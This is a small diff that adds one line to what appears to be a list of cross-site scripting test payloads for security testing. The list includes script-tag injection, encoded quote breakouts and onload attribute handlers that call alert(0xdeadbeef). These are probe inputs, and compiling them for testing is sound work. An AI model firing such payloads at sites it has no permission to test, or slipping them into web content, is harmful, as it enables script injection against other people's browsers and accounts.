@@ -29,3 +29,4 @@ innerHTML=location.hash>#<script>alert(0xdeadbeef)</script>
 %27><script>alert(0xdeadbeef)</script>
 %27onload=alert(0xdeadbeef)
 >#'onload=alert(0xdeadbeef)>
+"onload=alert(0xdeadbeef)
